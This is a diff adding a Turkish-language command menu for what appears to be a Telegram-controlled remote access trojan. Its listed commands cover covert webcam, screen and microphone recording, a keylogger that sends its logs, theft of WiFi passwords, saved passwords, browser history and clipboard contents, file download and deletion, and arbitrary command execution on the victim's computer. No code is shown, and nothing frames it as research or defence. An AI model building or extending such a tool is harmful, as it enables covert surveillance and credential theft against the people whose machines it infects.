@@ -1,0 +1,74 @@
+start - Botu başlat
+komutlar - Hızlı komut listesi
+yardim - Detaylı yardım mesajı
+help - Yardım mesajı
+
+kamerafoto - Kameradan fotoğraf çek
+kameravideo - 5 saniye video kaydet
+ekranfoto - Ekran görüntüsü al
+ekrankayit - 10 saniye ekran kaydı
+
+bilgiip - IP ve sistem bilgileri
+sistemdetay - Detaylı sistem bilgisi
+processlist - Çalışan programlar
+wifi - WiFi şifreleri
+clipboard - Pano içeriği
+diskbilgi - Disk kullanım bilgileri
+ramcpu - RAM ve CPU kullanımı
+portlar - Açık portlar
+usbcihazlar - USB cihazlar
+servisler - Sistem servisleri
+agbilgisi - Ağ bağlantı bilgileri
+sistemzaman - Sistem zamanı
+kullanicilar - Sistem kullanıcıları
+islemcidetay - İşlemci detayları
+bellekdetay - Bellek detayları
+
+keyloggerstart - Keylogger başlat
+keyloggerstop - Keylogger durdur
+keyloggerlog - Keylogger logları gönder
+
+dosyalist - Dosyaları listele
+dosyaindir - Dosya indir
+dosyasil - Dosya sil
+dosyaara - Dosya ara
+dosyaoku - Dosya içeriğini oku
+dosyayukle - Telegram'dan dosya yükle
+dosyayenidenadlandir - Dosya yeniden adlandır
+dosyakopyala - Dosya kopyala
+dosyatasima - Dosya taşı
+klasorolustur - Klasör oluştur
+dosyaboyutu - Dosya boyutu
+
+sifreler - Kayıtlı şifreler
+gecmis - Tarayıcı geçmişi
+webekran - Web sitesi ekran görüntüsü
+
+klavye - Klavyeden metin yaz
+fare - Fare konumu
+farehareket - Fareyi hareket ettir
+faretikla - Fare tıkla
+farecift - Çift tıklama
+faresurukle - Fare sürükle
+ekrankilitle - Ekranı kilitle
+komutcalistir - Komut çalıştır
+klavyekisa - Klavye kısayolu
+kapat - Bilgisayarı kapat
+yenidenbaslat - Bilgisayarı yeniden başlat
+
+tumpencereler - Tüm açık pencereler
+pencerebilgi - Aktif pencere bilgisi
+pencerekapat - Aktif pencereyi kapat
+pencerebuyut - Pencereyi büyüt
+pencerekucult - Pencereyi küçült
+pencereaktif - Pencereyi aktif et
+
+mikrofon - Mikrofon kaydı
+ekranparlaklik - Ekran parlaklığı ayarla
+sesduzeyi - Ses seviyesi ayarla
+tarayiciac - Tarayıcı aç
+uygulamaac - Uygulama aç
+oturumac - Yeni oturum aç
+ekrancozunurluk - Ekran çözünürlüğü
+ekranbekleme - Ekranı uyku moduna al
+
